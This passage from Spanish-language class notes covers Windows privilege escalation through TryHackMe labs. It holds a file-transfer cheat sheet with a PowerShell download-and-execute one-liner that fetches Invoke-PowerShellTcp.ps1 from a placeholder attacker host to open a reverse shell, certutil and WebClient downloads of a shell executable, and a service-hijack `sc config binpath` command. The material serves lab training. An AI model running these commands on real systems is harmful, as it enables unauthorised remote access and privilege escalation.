- **Ejemplo:** [Task 10 - Windows Privilege Escalation](https://tryhackme.com/room/windows10privesc).

### Scheduled Tasks
- **Descripción:** Tareas programadas mal configuradas permiten la escalada de privilegios.
- **Ejemplo:** [Task 13 - Windows Privilege Escalation](https://tryhackme.com/room/windows10privesc).

### Mimikatz
- **Descripción:** Herramienta para extraer credenciales de memoria y otros datos sensibles.
- **Ejemplo:** [Task 4 - Post Exploitation](https://tryhackme.com/room/postexploit).

### Persistence
- **Descripción:** Métodos para mantener el acceso en el sistema.
- **Ejemplo:** [Task 7 - Post Exploitation](https://tryhackme.com/room/postexploit).

---

## Transferencia de Archivos

Para descargar archivos en la máquina comprometida desde tu máquina Kali:

```bash
# Windows
curl -O http://[IP]/recurso
certutil.exe -f -urlcache -split "http://<LHOST>/<FILE>" <FILE>
powershell -c "Invoke-WebRequest -Uri 'http://[IP]:[PUERTO]/recurso' -OutFile 'C:\Windows\Temp\nombrequequeramos'"
Invoke-WebRequest http://[IP]/[RECURSO] -OutFile [NOMBREQUEQUERAMOS]
powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"
copy \\IP\recurso
```

### Ejemplo: Uso de WinPEAS
1. Descarga **WinPEAS** en Kali.
2. Transfiere el archivo a la máquina comprometida utilizando alguno de los comandos anteriores.
3. Ejecuta **WinPEAS** para identificar vulnerabilidades automáticamente.

---

## Exploits en Servicios

### Service Exploits - Insecure Service Permissions
- **Comando:** `sc config [Servicio] binpath= "cmd.exe /c reverse_shell"`.
- Sigue el ejemplo en la room de TryHackMe: [Windows 10 Privilege Escalation](https://tryhackme.com/room/windows10privesc).

### Service Exploits - Unquoted Service Path
- **Descripción:** Aprovecha rutas de servicio no citadas.
- Repite los pasos de la room de TryHackMe: [Windows 10 Privilege Escalation](https://tryhackme.com/room/windows10privesc).

---

## Tareas

- Completar la room: [Windows 10 Privilege Escalation](https://tryhackme.com/r/room/windows10privesc).
- Revisar el video de la clase si es necesario.
